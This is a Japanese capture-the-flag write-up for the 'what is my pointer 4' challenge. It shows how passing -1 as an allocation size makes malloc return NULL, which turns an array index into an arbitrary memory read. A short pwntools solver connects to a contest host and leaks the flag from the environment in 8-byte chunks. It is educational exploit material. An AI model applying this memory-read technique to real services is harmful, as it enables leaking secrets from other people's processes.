# what is my pointer 4

## 問題

アドレス当てゲーム

```c
int main(void) {
    printf("[DEBUG] flag: %p\n",getenv("FLAG"));

    puts("part1: alloc");
    size_t size;
    printf("size> ");
    scanf("%ld%*c",&size);
    unsigned long *item = malloc(size);

    puts("part2: read");
    printf("index> ");
    off_t index;
    scanf("%ld%*c",&index);
    printf("0x%lx\n",item[index]);

    puts("bye!!");
}
```

## 概要

最初に、環境変数から取得したフラグがあるアドレスを教えてもらえます。

その後、ユーザーは2つの入力を求められます。

1つ目は`size`で、10進数で入力するとそのサイズ分の領域を確保し、アドレスを`unsigned long*`型の`item`に保持します。

※C言語では`void*`型から他の型のポインタへの代入は暗黙のキャストが働くため、明示的なキャストは必要ありません。

2つ目は`index`で、10進数で入力すると`item`を`unsigned long`型の配列とみなしたときの`item[index]`すなわち`item`の値に`index`の値の8倍を足した場所にある8バイトを16進数で表示してくれます。

`malloc`が返すアドレスは実行するたびに変わるうえに教えてもらえないため、`index`の値をフラグの位置にピンポイントで合わせるのは無理そうですが、何を入力すればいいのでしょうか？

※ menu関数については結局何のためにあるのかわかりませんでした。

## 方針

malloc関数の仕様を突く。

## 解法

なんとなく`size`に`-1`を入力してみました。

```
[DEBUG] flag: 0x7ffda5bc7fc1
part1: alloc
size> -1
part2: read
index> 
```

エラーが発生して落ちるかと思ったら、実行がそのまま続けられるようです。

`item`に`NULL(=0x0)`が入れられて続行されるのでしょうか。

そのように仮定して、`index`にはフラグのアドレスを8で割った整数商を入力してみます。

```
[DEBUG] flag: 0x7ffda5bc7fc1
part1: alloc
size> -1
part2: read
index> 17590923005944
0x7b616361706c413d
bye!!
```

ものすごくそれっぽい結果が返ってきました。（特に0x41のあたりが。）

試しに[CyberChef](https://gchq.github.io/CyberChef/)で変換してみます。[変換結果](https://gchq.github.io/CyberChef/#recipe=From_Hex('None')&input=N2I2MTYzNjE3MDZjNDEzZA)
```
7b616361706c413d
▼ From Hex (Delimiter=Noe)
{acaplA=
```

これはアタリですね。

ただし、リトルエンディアンのため順番が逆になっているので、直す必要があります。

また、一度に8バイトまでしか取得できないので複数回に分けて取得する必要があります。

## ソルバー

```py
import pwn

#HOST, PORT = "localhost", 1337
HOST, PORT = "34.170.146.252", 44921

def get_flag(shift:int)->bytes:
    p = pwn.remote(HOST, PORT)
    d = p.recvline().decode().strip()
    flag_adr = int(d.split()[-1], 16)
    idx = flag_adr // 8 + shift
    p.sendlineafter(b'size> ', b'-1')
    p.sendlineafter(b'index> ', str(idx).encode())
    d = p.recvline().decode().strip()
    p.close()
    return bytes.fromhex(d[2:])[::-1]

flag = b''
for i in range(4):
    flag += get_flag(i)
print(f"{flag = }")
```
```
flag = b'AG=Alpaca{*****************}\x00REM'
```

## 補足

あとでわかったのですが、`-1`でうまくいった理由は、サイズに負の値を渡したからではなく、オーバーフローして巨大な整数になることでした。

`size_t`型は通常符号なし64ビット整数なので、`-1`は`0xffffffffffffffff = 18446744073709551615`として解釈されます。

malloc関数はメモリが不足している場合にNULLを返す（[参考](https://learn.microsoft.com/ja-jp/cpp/c-runtime-library/reference/malloc?view=msvc-170)）ので、この方法が成立していたのです。

なので、`size`には`999999999999999`などの大きい整数を直接入力しても大丈夫でした。
